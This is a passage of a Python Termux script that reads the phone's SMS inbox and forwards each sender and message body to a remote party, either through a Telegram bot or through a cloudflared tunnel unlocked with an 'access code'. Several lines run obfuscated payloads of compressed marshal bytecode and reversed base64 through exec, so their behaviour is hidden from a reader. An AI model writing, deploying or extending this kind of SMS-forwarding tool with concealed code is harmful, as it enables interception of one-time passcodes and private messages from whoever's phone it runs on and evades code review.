16$\r6\x88H\x889\xb5\x99a\xe9\r\x80\x96\x84\xe3\x1a\xach\x039\xc9\x00\xdcm\xd9\xf7\x9aK}+\xf9\x8a<\\`\xc9\xb7R\xc8\x17\r\xdfR\xf6ZW\xb3_&\xc5\xab\xe3\x93:\x91J6nZ\xb7\x9b-Iid\xac\xd1\xc2\xc6(Z#B\xfe:\xdaJ\x9f\xc0\xc7\x05\xfb\x17\x18\xa5\xa6\xe6!l\xde\xd9\x92"\x94F\xd8\x1d\x8a\xd4pP7\x98\x83\xb4\xcdY\x13U\xa2G0\x89<E\xe9\xe5\x18\xb0\x14\x1f\x9c\xb4\x161\xb5c:\x03\x9d\x12\x80\x7fY{\x0b\x15?\x9f6\xed\xdb\xf3\x10{\x9cKje\xd2p\xaaW\xf5\x96\xa9wf"e\rg\xaf\x9c\xc5\x0ej\x982O5\xf3\xf7/\x9b;h\xc6\x89\xa8\xa9\x12\x85,\xd9\xa0a\xa5$/\x1b\'W\x16R\xe71\x8f\x98\x91\xc2\x98\xae\xe9\xc9q\xc2\xaf\x1a0\xdd\xfa\xc4_9Z\xfd\xd0\xf5\x83`\xa9bN\x16\xa3b={j<\xd1%\n\x15\xd1\xc6>\x91\xef\x8f~\xc3ck\x03\xad\xef\xc7\x8f1\xc7\xa9\xe0\xa0w&\x06e\x108Y\xe6\xf1\x10\xa2i\xc2\xd9\x19\x9e&lJ;\x8b\xd0.=\xfa$"&d2YO\x92\xb3\xbff\xa3\xec\x1e\xaahb:\x8c\xd1Q\xe2\x95\x0fc*R\xec\x0c\xf3\x92\xd9g}\x1a\x97\x08\xa2\x10\xe2\x87\xa0\xde\x07\xb8\xf3\xe5?N+%\xecMj\xad\xac\xc0\x97\x84\xf3\xf6*\xc4H\xb5\x86\xda\xb3\x9d8\xe3[\xb7\xe6\xad\xac\xbe\xa0\x85\xc8oD\xb9\x1e\xd9\xc9^\xe53\x99\x8e\x01.\xfc\'MP\xb5\xbb1\x03\xa6\xf7c\xb5W1\xcb\xf8r\x8aR\xb3\xc18\xf1eB$\xd0\xc4\xef$\x11\xab\x95X\xa3\x08\x18\x8aH\xe9c\x85\x1b\xdb=|\xf1\x86\x98,\xadH\xc1\xe8\x9c\xd9T\xb0\x06J\xa4\x11\xba\xe6\xf7\xed\xd1_X\xb9s\x9dB\xc9[s\x83d\xe1\xd1L+f\xa9\x87`V\xa5\x8a\xceR\x86\xae\xd0*-\x13\xc5\x8d\xd4\xa7B\x91;\xb0E\\\xc0LWD\xb3\xb4Ka\xa3\xb2\xbd\x1d[\xcf\x9f/\x05\xfb\x0ei\x1d\xa7\xbc\xddf\x92\x1c\xc1\xbd\x14q\x15Dj\'l\xc5H\x8672\x9aV\xa3\x83\xd4\xec\x91&GZ\xcd$\xb6S\x87\xee-N\x85{N(\xf8\xfb\xc7\x1b\xda]\x01a\xe3\xdf\xba\x9e\x9bg\xafT\x84\xa2\xc5\xeb\'\x8f\x01\xfd\xa4\xf3\x19\x92\xdd\x07E\xa3^\xad\xea\xc0\x93\xcf\x8f1\x87O\xdf\xd8p\xf1\xc2\x8e\xac\xbf\xa8\xf9\xff9<\x17\t\x95>q8`\xfear\x8a\xfeB\x08\x7f\x13\x87N\xcdFb\xd4f\x10N\xdb\x976\xedVN\x04]8\xb7f\xa5\x8b\x16\xdc\xd7\xb7a\xdd\xa7N\x1dWr\x99|\xa7\x16mFj\n\xeay\xc5^\x02\xe2C8\x12\xc38\xe8\xc2;\x15\x82\t\xc7Z\x82i\xf5\xc5<\xa3\xe4$\xaf]\xc8\x10\x90\xae\xc0\x1c\xf6+\x7f\x8f`\x16{\x15\xbf\x97\xc1\xa5\xbc\xcf!\xa6\xab^\xd8\xf3ls\xfc\xe71\xbehlU\x7f\xdf\x1b\xcfg6\x1d/\x84\x80\xe9|*A\xf4\xe9\xca\x1f\t\xb2\xea\x0e\xa7G\xabj\x92\xb5^\x86\xcf\xb1Qr\t\xae\x7f\xffk\xedR\xa1\xe8\xf3\xbd\xf6g\x17\x12\x8d\x15b\x84\xb1\xdd\xa4\xbdx\x81d\x02\xeebX\x06\x90w\xe5\x03\xac\x06\x85%\xdf\xcb\xd1\xf2y\x10\x86\xa8p\xb0\xc9\xf7\'\x0c\xa8w9\xb0\xc3a\xb6\xe8v9\xc1\xea\xd6e#\x13\xc9\xe8\xb2}\x95\x85\xea\x12\x9d\xf2\xb98\xf2\x1f]\xff\xf4;\xcd$\x86W@\xdd\x1dC,\x00\x17\x8ct\x1a\x8b\xddkA\xbf\xba\xdb\x9aPy\xea\x0f\x97$\xb6\x83\x8a0\xf6q\xbf\xf6)C\xc6~>\xe2\xc2\xd4a\xcc\xe6\xd8\xf2?\x05\x99\xce/K\x90\xe7\xdf\xfa\x06\x81\xad}\x1f\xf4\x80\x0f\xda\x1bY\xb0\xe1\xa5 =\xa5\xe7\xf7\xf2\xfa<\xa6\xbf\xeao\x8ey\x98F\xb6\xf65\xf4|\xc0\x01\xf8\xb9\x02\xe44a\xed\x1as\xd1\xf3\xc0\x0f\xaeC\xa0jm\xa6\xfb\t\r\xbb\x9c\x7f\xf9\xc8\xe7&\x12Y\xc9\x1aB<\x86r\x06\x93\xd4\x8e\xa4\xb5!\xa7J\xbdM\xba\x14\xebAN\x9f\xb1-5\xa1d\xd4\x88\x15AoBD>\xf0\x03\xcf\x9f\xff\xbb4\xbb\xed\x01%\xees\xddy\xe1\xees\xde\xf7G\x91K\x16m\x92g\x19\xe2fr^\xd7\xc8\xc0\x12A7\xf2?g\xf4\x0c\x04\xb3\xc0!\x92\x9f\xa2\xe8\xbb\x04\x0b?\xb4R-\xb6\x06 \xeam\x8b\x07E\xd8\xa3\x11H\xb7\x10\x08\xc7P\x08\xb7\x01\x8c$\xa2\x1f\x12\x89D\xa2JH\xa5\x9d\xda\xe7\xef\xdf\xbdEc\x1c2\xf5\x07\xa9\xb1D\xf67cq_\x8e<x\xf1<<\xe1\xack\xd4\x95\xd6\xdb\x8c[8\xad\x9cx'))
server = lambda __ : __import__('marshal').loads(__import__('zlib').decompress(__[::-1]));exec((server)(b'\x86sD|\x00~\xb0\t0\x18\x1fr\x8c\x9c,\x0f\xc6FFf\x07\xc4\x80\xe5\x8bR4 \x91]\xaaNiJ~nM\x87\x17\xe2@\xbcER\x07\xe2(d\xad\x16\xc1\x194\xfc\xd7\x90g\xec\x87\x02\xf6_\x83w\xc1\xd7i"\xbb\xb4\x94^\xda\xe8.\xd2\x1bi\x15\x9dI%\xce\xa4\xba\xe9RC8\r\xdb\x07u\x8aq\xc3=, }(\xe9\x17\xe0\xdd\xca\xb1\xb00?\x85\xb87\x1e\r\xf5=\xf5\x9d"\x19\x89~]\xe7\x83fO`BdO\x97p\xc0\xd1 `\xe2\xec\xe4\x1cP\x1f\x11d\xb0*\xd0\x1d\x85M\xb3\x17\xe0\xc0\x14\x1b@l\xc5\xd9y\x999\xf1E\xa9eE\xa9\xc5I\xa9\xe5|\xd1\x01\xcf\xceKb\xdcT\xe7\xc7\x97\xe5\x15\xb1n\xf3\xf32K\x13\x93\xf2r8\xb7\x95`\xd9E\xf9\xe5B\x80S\xf3\x92X\xb7l\x9a\xa9\xa5y\x03\xc4\x96\xa7\xa6qoRr\x93\x132s\x12\xcb\x138\xb7\xc5%\xa9\xa9\x19\xc5l[\xe6M1 \x97\xb7! \x97\xbf\x16^\xe8\x15\x86\xb5\x953BcIa\xaea\xa8\x0b\x01\x89\x80\xb8\xc3R\xc2\x9b#\xe4\x0c\xc5\xd2FaJa\xa8f\naJf*a\xaae\xa9\xcd\xc3V3@e\x86\x1a\x99\x08\xcc%\x8c\xb5\xd9\xc2J0\xa5I \x95\xd5\x80\xa6\xeaA\x99\x88\x05\x8e\xa4\x88\xcc\x94\xc9\xa0\xcc\x18\xc2\x90\xc5\x10\xc2\xd0\xc2\x90\xce\x98\x90\x0f3\xfaP\x8c\x02@fK\x9cx'))
generate_code = lambda __ : __import__('marshal').loads(__[::-1]);exec((generate_code)(b'\x00\x00\x00\x16r\x10\x01\n\x00\xf0\x10\x01\n\x00\xf0\x10\x01\n\x00\xf0\x10\x01\n\x00\xf0\x10\x01\n\x02\xf0\x01\x01\x01\x03\xf0\x00\x00\x00\x1es\x00\x00\x00\x01\x00\x00\x00\x18r>eludom<\x08\xfa\x00\x00\x00\x14r\x00\x00\x00\x16r\x00\xa9\x00\x00\x00\x15r\x01)N\x00\x00\x00\x00\xf3K\x80\x0f\x0b\xd8D\x04\xd0D\x04\xd4D\x04\xd1D\x04\xd0)\xbc\x11\xc0&\xbd\x06\xa8\x06\xa0\x0e\x90\x0f\x04\xdd8\x04\xd08\x04\xd48\x04\xd18\x04\xd0i\xacQ\xb0f\xadF\x98F\x90\x02\x90\x0f\x04\xddF\x80{\x8c\x01\x98\x17\x0f\xd8F\x80{\x8c\x01\x98\x17\x0f\xd8H\x80\x7f\x8c\x7f\x89\x14\x98\x18\x0f\xdd\x1d\x04\xd0\x1d\x04\xd4\x1d\x04\xd1\x04\x98\x18\x05\x00\x06\xf5&\x05\x02\x05\xf0\x05\xa0%\x08\xd0\x7f\x8c\x7f\x89\x14\x98\x18\x0f\xdd\x04\x88P\x0f\xd4P\x0f\xd1O\x17\xd4O\x17\xd1Q\xc8K%\xd0}\x92}\x97v\x95w\x8aw\x8f\x11\x0f\xd8&\x05\x02\x02\xf0\x00\x80\x00\x00\x00\xa2s\x00\x00\x00\x01\x00\x00\x00\x15redoc_etareneg\r\xda>x<\x03\xfa     \x00\x00\x00\x05sxl_loc\x06\xdaxl_wor\x06\xdanoitacol\x08\xdaedoc\x04\xdaknil_revresbew\x0e\xda\x05)steehs\x06\xdaatad_etadpu\x0b\xdaenilybenilatadetirw\x13\xdaelbailava\t\xdaelpmas\x06\xdamodnar\x06\xdanioj\x04\xda\x07)teehskrow\t\xda\x01)\x00\x00\x00\x01\xe9\x00\x00\x00\x00\xe9\x00\x00\x00\x07\xe90987654321ZYXWVUTSRQPONMLKJIHGFEDCBA$\xda\x00\xdaTN\x08)\x00S\x01|\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x04\xab\x00\x00\x04\xa6\x07\xac\x00\x00\x00\x00\x00\x00\x00\x00\x00\x19\x06d\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x0ct\x04|\x03|\x00|\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x0bt\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x04\xab\x00\x00\x04\xa6\x07\xac\x00\x00\x00\x00\x00\x00\x00\x00\x00\x19\x06d\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x0ct\x04|\x03|\x02d\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x0bt\x04}\x00\x00\x00\x00\x00\x00\x00\x00\x00\x19\x06d\x02|\x03}\x00\x00\x00\x00\x00\x00\x00\x00\x00\x19\x05d\x02|\x02}\x00\x00\x00\x00\x00\x00\x00\x00\x01\xab\x00\x00\x01\xa6\x01|\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x07t\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\xab\x00\x00\x01\xa6\x01|\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\tt?\x8c\x01n\x01s\x00\x00\x00\x00\x00\x00\x00\x00\x01\xab\x00\x00\x01\xa6\x01|\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x07t\x01}\x00\x00\x00\x00\x00\x00\x00\x00\x01\xab\x00\x00\x01\xa6\x00\x00\x00\x00\x00\x00\x00\x00\x02\xab\x00\x00\x02\xa6\x04d\x03d\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\xa0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02t\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xa0\x02d\x00\t\x00\x97\x00\x00\x01Z\xf3\x00\x00\x00\x03\x00\x00\x00\x07\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01c\x02)\x00S\x01d\x00Z\x00\x84\x00d\x00\x97\x00\x00\x00\x0c\xf3\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00c'))



def port():
    def is_port_available(host, port):
        try:
            # Create a socket object
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                # Attempt to connect to the specified host and port
                s.settimeout(1)  # Set a timeout for the connection attempt
                s.connect((host, port))
                return False  # Port is not available
        except (socket.timeout, ConnectionRefusedError):
            return True  # Port is available
    while True:
        random_port = "".join(random.sample("123456789", 4))
        if is_port_available("127.0.0.1", int(random_port)):
            return random_port

def on_termux():
    def receiver():
        while True:
            banner()
            print()
            echo_top()
            echo(f"{reset}{bold}{white}Enter Random Axcess Code (RAC){reset}")
            echo("══", red+"╠", "╝", "═")
            echo("  ", red+"║", " ")
            code = center_input(f"╚════► {yellow}")
            if not avaliable(code):
                print()
                echo_top()
                echo(f"{reset}{bold}{magenta}Incorrect Random Axcess Code{reset}")
                echo_bottom()
                sleep(2)
                del code
            else: break

        banner()
        _server = str(server(code))
        web_messages = _server + "/LhcfeNnIdZvmqBFWKJrwXoYEtzpDQhPAHgjbMysuUaCVSRxkTO"

        banner()
        print()
        echo_top()
        echo(f"{reset}{bold}{white}Use {cyan}( {magenta}Ctrl + C {cyan}) {white}to stop{reset}")
        echo_bottom()
        print()
        print()

        _ID = ""
        while True:
            try:
                data = requests.get(web_messages).json()[0:10]
                for _data in data:
                    id  = decode(_data.get("id"))
                    number  = decode(_data.get("number"))
                    message = decode(_data.get("message"))

                    if not (re.search(id, _ID)):
                        echo_top()
                        echo(f"{reset}{bold}{yellow}{number}{reset}")
                        echo("══", red+"╠", "╣", "═")
                        for text in handle_text_overflow(message, total_area() - 6):
                            echo(f"{reset}{bold}{white}{text}{reset}")
                        echo_bottom()
                        print()
                        _ID += id
                sleep(1)
            except IndexError: sleep(1)
            except KeyboardInterrupt: break
            except:
                echo_top()
                echo(f"{reset}{bold}{red}STOPPED !{reset}")
                echo("══", red+"╠", "╣", "═")
                for text in handle_text_overflow("Suddenly, the transfer of messages between Termux instances has been interrupted.", total_area() - 6):
                    echo(f"{reset}{bold}{white}{text}{reset}")
                echo_bottom()
                print()
                sleep(3)
                break

        sleep(1)
        main_menu()
        exit()
    def sender():
        _port = port()
        json_file = ".core/termux_instances.json"

        with open(json_file, "w") as file: file.write('[]')

        banner()
        def python_local_server():
            subprocess.getoutput(f"python .core/on_terminal.py {json_file} {_port}")
        _python_server = thread_with_trace(target=python_local_server)
        _python_server.start()


        def cloudflared_server():
            try: os.remove("cloudflared.log")
            except: pass
            os.system(f"./cloudflared tunnel -url 127.0.0.1:{_port} --logfile cloudflared.log > /dev/null 2>&1 &")
            sleep(15)

        _cloudflared_server = thread_with_trace(target=cloudflared_server)
        _cloudflared_server.start()

        banner()
        while _cloudflared_server.is_alive():
            animation = ['⠋  Generating Axcess Code', '⠙  Generating Axcess Code', '⠹  generating Axcess Code', '⠸  GEnerating Axcess Code', '⠼  GeNerating Axcess Code', '⠴  GenErating Axcess Code', '⠦  GeneRating Axcess Code', '⠧  GenerAting Axcess Code', '⠇  GeneraTing Axcess Code', '⠏  GeneratIng Axcess Code', '⠋  GeneratiNg Axcess Code', '⠙  GeneratinG Axcess Code', '⠹  Generating Axcess Code', '⠸  Generating axcess Code', '⠼  Generating AXcess Code', '⠴  Generating AxCess Code', '⠦  Generating AxcEss Code', '⠧  Generating AxceSs Code', '⠇  Generating AxcesS Code', '⠏  Generating Axcess Code', '⠋  Generating Axcess code', '⠙  Generating Axcess COde', '⠹  Generating Axcess CoDe', '⠸  Generating Axcess CodE', '⠼  Generating Axcess Code']
            for anim in animation:
                bar  = anim.split(" ")[0]
                text = " ".join(anim.split(" ")[2:6])
                sys.stdout.write(f"\r{center(f'{yellow}{bar}  {white}{text}', False)}")
                sys.stdout.flush()
                sleep(0.05)

        webserver_link = subprocess.getoutput("echo $(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' \"cloudflared.log\")")
        if re.search(".trycloudflare.com", webserver_link):
            requests.get(webserver_link)
            def read_sms():
                Identity = ""
                jsonfile = json_file
                while True:
                    try:
                        details = json.loads(subprocess.getoutput("termux-sms-list -l 10 -t inbox -n"))
                        for data in details:
                            Message_identity = data["_id"]
                            if (time.strftime("%Y-%m-%d")) == (data["received"].split(" ")[0]) and ("".join(data["received"].split(" ")[1].split(":")[:-1])) == (time.strftime("%H%M")):
                                Message_identity = str(Message_identity)
                                if not (re.search(Message_identity, Identity)):
                                    encode  = lambda data : str(base64.b32encode(str(base64.b64encode(data.encode('utf8'))[::-1])[2:-1].encode('utf8'))[::-1])[2:-1]
                                    id = encode(str(data['_id']))
                                    number = encode(str(data["number"]))
                                    message = encode(str(data["body"]))
                                    log_entry = {
                                        "id": id,
                                        "number": number,
                                        "message": message
                                    }
                                    try:
                                        old_data = json.loads(open(jsonfile, "r").read())
                                        if (len(old_data) == 0) :
                                            with open(jsonfile, "w") as file:
                                                json.dump([log_entry], file, indent=4)
                                        else:
                                            main_data = []
                                            for info in old_data:
                                                main_data.append(info)
                                            main_data.append(log_entry)
                                            with open(jsonfile, "w") as file:
                                                json.dump(main_data, file, indent=4)
                                    except json.decoder.JSONDecodeError:
                                        with open(jsonfile, "w") as file:
                                            json.dump([log_entry], file, indent=4)

                                    Identity += Message_identity
                    except: break
            banner()
            print()
            echo_top()
            echo(f"{reset}{bold}{white}Please Wait...{reset}")
            echo_bottom()
            _read_sms = thread_with_trace(target=read_sms)
            _read_sms.start()
            _rac = generate_code(webserver_link)
            banner()
            print()
            echo_top()
            echo(f"{reset}{bold}{white}Random Axcess Code{reset}")
            echo("══", red+"╠", "╣", "═")
            echo(f"{reset}{bold}{yellow}{_rac}{reset}")
            echo_bottom()
            print()
            print()
            echo_top()
            echo(f"{reset}{bold}{white}Use {cyan}( {magenta}Ctrl + C {cyan}) {white}to stop{reset}")
            echo_bottom()
            print()
            def signal_handler(a, b):
                banner()
                print()
                echo_top()
                echo(f"{reset}{bold}{white}Please Wait...{reset}")
                echo_bottom()
                print()
                try: os.remove(json_file)
                except: pass
                try: os.remove("cloudflared.log")
                except: pass
                row_lx, col_lx = avaliable(_rac)
                _ = lambda __ : __import__('base64').b64decode(__[::-1]);exec((_)(b'==QKdFzWzRXZlh2c9QXZlh2crJ3b3BCL4x2Xs92YgwCes91dvJHIsIiIoEGdhR2XlRXYkBXdKkSM0VWZoNnLzRXZlh2c9QXZlh2crJ3b3BCL4x2Xs92YgwCes91dvJHIsIiIoEGdhR2XlRXYkBXd'))
                _python_server.kill()
                _cloudflared_server.kill()
                _read_sms.kill()
                subprocess.getoutput("killall cloudflared /dev/null 2>&1 &")
                program_exit()
                sys.exit()
            signal.signal(signal.SIGINT, signal_handler)
            while True:
                time.sleep(1)
            exit()
        else:
            banner()
            print()
            echo_top()
            echo(f"{reset}{bold}{red}ERROR{reset}")
            echo("══", red+"╠", "╣", "═")
            echo(f"{reset}{bold}{yellow}Could Not Start Cloudflared Service{reset}")
            echo_bottom()
            print()
            print()
            echo_top()
            echo(f"{reset}{bold}{white}Check Following Possible Reasons{reset}")
            echo("══", red+"╠", "╣", "═")
            echo(f"{reset}{bold}{yellow}Turn On Your Mobile Hotspot{reset}")
            echo(f"{reset}{bold}{yellow}Cloudflared Already Running{reset}")
            echo(f"{reset}{bold}{yellow}Check Your Internet Connection{reset}")
            echo_bottom()
            print()
            print()
            echo_top()
            echo(f"{reset}{bold}{lightcyan}Press Enter For Restart{reset}")
            echo("══", red+"╠", "╝", "═")
            echo("  ", red+"║", " ")
            center_input(f"╚════► {yellow}")
            _python_server.kill()
            _cloudflared_server.kill()
            subprocess.getoutput("killall cloudflared /dev/null 2>&1 &")
            try: os.remove(json_file)
            except: pass
            try: os.remove("cloudflared.log")
            except: pass
            on_termux()
            exit()
    
    banner()
    print()
    echo_top()
    echo(f"{reset}{bold}{white}Staring local server...{reset}")
    echo_bottom()

    create_local()

    banner()
    print()
    echo_top()
    echo(f"{reset}{bold}{white}Can You Clarify Your Identity ?{reset}")
    echo_bottom()
    print()
    center(f"{bold}{magenta} [{white}01{magenta}]  {reset}{yellow}Sender  {reset}")
    center(f"{bold}{magenta} [{white}02{magenta}]  {reset}{yellow}Receiver{reset}")
    center(f"{bold}{magenta} [{white}03{magenta}]  {reset}{yellow}Back    {reset}")
    center(f"{bold}{magenta} [{white}04{magenta}]  {reset}{yellow}Exit    {reset}")
    print()

    echo_top()
    echo(f"{reset}{bold}{lightcyan}Choose An Option...{reset}")
    echo("══", red+"╠", "╝", "═")
    echo("  ", red+"║", " ")
    user_choice = center_input(f"╚════► {yellow}").lower()

    if   (user_choice == "1") or (user_choice == "01") or (user_choice == "one") or (user_choice == "sender"):
        sender()
    elif (user_choice == "2") or (user_choice == "02") or (user_choice == "two") or (user_choice == "receiver"):
        receiver()
    elif (user_choice == "3") or (user_choice == "03") or (user_choice == "three") or (user_choice == "back"):
        main_menu()
    elif (user_choice == "4") or (user_choice == "04") or (user_choice == "four") or (user_choice == "exit"):
        program_exit()
    else:
        echo_top()
        echo(f"{reset}{bold}{magenta}Invalid Option{reset}")
        echo_bottom()
        sleep(1)
        del user_choice
        on_termux()

def on_telegram():
    def read_sms(chatid:int):
        token = get_token()
        banner()
        total_send    = 0
        total_recived = 0
        total_failed  = 0

        def on_telegram_small_menu(chat_id, total_send, total_recived, total_failed):
            if (total_send < 9):
                total_send    = "0" + str(total_send)
            else: total_send = str(total_send)
            if (total_recived < 9):
                total_recived = "0" + str(total_recived)
            else: total_recived = str(total_recived)
            if (total_failed < 9):
                total_failed  = "0" + str(total_failed)
            else: total_failed = str(total_failed)
            banner()
            echo_top()
            echo(f"{reset}{bold}{white}Transmit Messages On ChatID:{chat_id}{reset}")
            echo_bottom()
            print()
            echo_top()
            echo(f"{bold}{white}Total Messages Received {magenta}[ {cyan}{total_recived}{magenta} ]{reset}")
            echo("══", red+"╠", "╣", "═")
            echo(f"{bold}{white}Total Messages Forward {magenta}[ {cyan}{total_send}{magenta} ]{reset}")
            echo("══", red+"╠", "╣", "═")
            echo(f"{bold}{white}Total Messages Failed {magenta}[ {cyan}{total_failed}{magenta} ]{reset}")
            echo_bottom()
            print()
            echo_top()
            echo(f"{reset}{bold}{white}Use {cyan}( {magenta}Ctrl + C {cyan}) {white}to stop{reset}")
            echo_bottom()
        on_telegram_small_menu(chatid, total_send, total_recived, total_failed)
        Identity = ""
        while True:
            details = json.loads(subprocess.getoutput("termux-sms-list -l 10 -t inbox -n"))
            for data in details:
                Message_identity = data["_id"]
                if (time.strftime("%Y-%m-%d")) == (data["received"].split(" ")[0]) and ("".join(data["received"].split(" ")[1].split(":")[:-1])) == (time.strftime("%H%M")):
                    Message_identity = str(Message_identity)
                    if not (re.search(Message_identity, Identity)):
                        message = "<b>From : " + str(data["number"]) + "</b>\n<i>" + str(data["body"]) + "</i>"
                        total_recived += 1
                        if send_msg(message, token, chatid):
                            total_send += 1
                        else: total_failed += 1
                        on_telegram_small_menu(chatid, total_send, total_recived, total_failed)
                        Identity += Message_identity
    def remove_token():
        if os.path.exists(".core/telegram_token.config"):
            try: os.remove(".core/telegram_token.config")
            except: pass
            banner()
            print()
            echo_top()
            echo(f"{reset}{bold}{white}Token Removed !{reset}")
            echo_bottom()
            sleep(2)
        else:
            banner()
            print()
            echo_top()
            echo(f"{reset}{bold}{white}Token Not Found !{reset}")
            echo_bottom()
            sleep(2)
    def get_token():
        if os.path.exists(".core/telegram_token.config"):
            data = json.loads(decode(open(".core/telegram_token.config").read()))
            token = decode(data.get("token"))
            return token
        else: return False
    def get_chatid():
        if os.path.exists(".core/telegram_chatid.config"):
            data = json.loads(decode(open(".core/telegram_chatid.config").read()))
            chatid = decode(data.get("chatid"))
            return int(chatid)
        else: return False
    def set_token(token):
        with open(".core/telegram_token.config", "w") as file:
            json_data = encode(json.dumps({"token":encode(token)}))
            file.write(json_data)
    def save_chatid(chatid):
        with open(".core/telegram_chatid.config", "w") as file:
            json_data = encode(json.dumps({"chatid":encode(chatid)}))
            file.write(json_data)
    def token_valid(token):
        try:
            response = requests.get(f'https://api.telegram.org/bot{token}/getMe')
            if response.status_code == 200:
                data = response.json()
                if data.get('ok', False):
                    return True
        except: pass
        return False
    def send_msg(message, token, chatid):
        bot = telebot.TeleBot(token)
        try:
            bot.send_message(int(chatid), message, parse_mode='HTML')
            return True
        except:
            return False
    def process(chatid:int):
        banner()
        print()
        echo_top()
        echo(f"{reset}{bold}{white}Use {cyan}( {magenta}Ctrl + C {cyan}) {white}to stop{reset}")
        echo_bottom()
        print() 
        try: read_sms(chatid)
        except KeyboardInterrupt: pass
        token = get_token()
        send_msg("<b><i>The process of transferring SMS messages has been stopped, and it is currently not avaliable.</i></b>",  token, chatid)
        main_menu()
        exit()

    banner()
    print()
    echo_top()
    echo(f"{reset}{bold}{white}Choose An Option{reset}")
    echo_bottom()
    print()
    center(f"{bold}{magenta} [{white}01{magenta}]  {reset}{yellow}Use Recent Bot Token{reset}")
    center(f"{bold}{magenta} [{white}02{magenta}]  {reset}{yellow}Use New Bot Token   {reset}")
    center(f"{bold}{magenta} [{white}03{magenta}]  {reset}{yellow}Remove Saved Token  {reset}")
    center(f"{bold}{magenta} [{white}04{magenta}]  {reset}{yellow}Back                {reset}")
    center(f"{bold}{magenta} [{white}05{magenta}]  {reset}{yellow}Exit                {reset}")
    print()

    echo_top()
    echo(f"{reset}{bold}{lightcyan}Choose An Option...{reset}")
    echo("══", red+"╠", "╝", "═")
    echo("  ", red+"║", " ")
    user_choice = center_input(f"╚════► {yellow}").lower()

    if   (user_choice == "1") or (user_choice == "01") or (user_choice == "one") or (user_choice == "recent"):
        ReCenT = True
    elif (user_choice == "2") or (user_choice == "02") or (user_choice == "two") or (user_choice == "new"):
        ReCenT = False
    elif (user_choice == "3") or (user_choice == "03") or (user_choice == "three") or (user_choice == "remove"):
        remove_token()
        on_telegram()
        exit()
    elif (user_choice == "4") or (user_choice == "04") or (user_choice == "four") or (user_choice == "back"):
        main_menu()
        exit()
    elif (user_choice == "5") or (user_choice == "05") or (user_choice == "five") or (user_choice == "exit"):
        program_exit()
    else:
        echo_top()
        echo(f"{reset}{bold}{magenta}Invalid Option{reset}")
        echo_bottom()
        sleep(1)
        del user_choice
        on_termux()


    if not ReCenT:
        banner()
        echo_top()
        echo(f"{reset}{bold}{lightcyan}Enter telegram bot axcess token{reset}")
        echo("══", red+"╠", "╝", "═")
        echo("  ", red+"║", " ")
        token = center_input(f"╚════► {yellow}")
        banner()
        print()
        echo_top()
        echo(f"{reset}{bold}{white}Checking Token Validation...{reset}")
        echo_bottom()
        if not token_valid(token):
            banner()
            print()
            echo_top()
            echo(f"{reset}{bold}{white}Invalid Bot Token...{reset}")
            echo_bottom()
            sleep(3)
            on_telegram()
            exit()
        else:
            banner()
            print()
            echo_top()
            for text in handle_text_overflow(f"Access the recipient's Telegram bot, send the '/log' message, and after doing this, the SMS forwarding process will start.", total_area() - 6):
                echo(f"{reset}{bold}{white}{text}{reset}")
            echo_bottom()
            set_token(token)
            try:
                bot = telebot.TeleBot(token)
                @bot.message_handler(commands=['log'])
                def send_auth(message):
                    banner()
                    echo_top()
                    echo(f"{reset}{white}Authentication Sucessfully..{blue}!!{reset}")
                    echo_bottom()
                    save_chatid(str(message.chat.id))
                    bot.send_message(message.chat.id, '<b><i>Authentication sucessfully.</i></b>', parse_mode='HTML')
                    bot.send_message(message.chat.id, '<b><i>The SMS forwarding process has been initiated, and you will receive all messages through this Telegram bot.</i></b>', parse_mode='HTML')
                    raise TypeError
                bot.polling()
            except TypeError: pass
            except KeyboardInterrupt:
                on_telegram()
                exit()
            chatid = get_chatid()
            process(chatid)
            exit()
    else:
        if not os.path.exists(".core/telegram_token.config"):
            banner()
            print()
            echo_top()
            echo(f"{reset}{bold}{white}Token Not Found !{reset}")
            echo_bottom()
            sleep(2)
            on_telegram()
            exit()
        else:
            banner()
            print()
            echo_top()
            echo(f"{reset}{bold}{white}Checking Token Validation...{reset}")
            echo_bottom()
            token = get_token()
            if not token_valid(token):
                banner()
                print()
                echo_top()
                echo(f"{reset}{bold}{white}Token Validation Failed !{reset}")
                echo_bottom()
                sleep(3)
                try: os.remove(".core/telegram_token.config")
                except: pass
                on_telegram()
                exit()
            else:
                banner()
                print()
                echo_top()
                for text in handle_text_overflow("Access the recipient's Telegram bot, send the '/log' message, and after doing this, the SMS forwarding process will start.", total_area() - 6):
                    echo(f"{reset}{bold}{white}{text}{reset}")
                echo_bottom()
                set_token(token)
                try:
                    bot = telebot.TeleBot(token)
                    @bot.message_handler(commands=['log'])
                    def send_auth(message):
                        banner()
                        echo_top()
                        echo(f"{reset}{white}Authentication Sucessfully..{blue}!!{reset}")
                        echo_bottom()
                        save_chatid(str(message.chat.id))
                        bot.send_message(message.chat.id, '<b><i>Authentication sucessfully.</i></b>', parse_mode='HTML')
                        bot.send_message(message.chat.id, '<b><i>The SMS forwarding process has been initiated, and you will receive all messages through this Telegram bot.</i></b>', parse_mode='HTML')
                        raise TypeError
                    bot.polling()
                except TypeError: pass
                except KeyboardInterrupt:
                    on_telegram()
                    exit()
                chatid = get_chatid()
                process(chatid)
                exit()

def on_webpage():
    def sms_read(jsonfile):
        Identity = ""
        while True:
            try:
                details = json.loads(subprocess.getoutput("termux-sms-list -l 10 -t inbox -n"))
                for data in details:
                    Message_identity = data["_id"]
